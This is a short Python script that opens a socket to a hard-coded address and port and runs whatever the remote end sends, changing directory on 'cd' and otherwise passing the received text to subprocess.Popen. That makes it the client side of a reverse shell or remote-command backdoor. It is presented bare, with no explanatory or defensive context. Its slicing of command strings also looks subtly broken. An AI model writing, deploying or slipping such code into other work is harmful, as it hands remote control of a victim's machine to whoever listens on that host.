import socket
import os
import subprocess


s = socket.socket()  # Create a socket
host = "192.168.2.10"
port = 8888

s.connect((host, port))

while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))

    if len(data) > 0:
        cmd = subprocess.Popen(data[3:].decode("utf-8"))
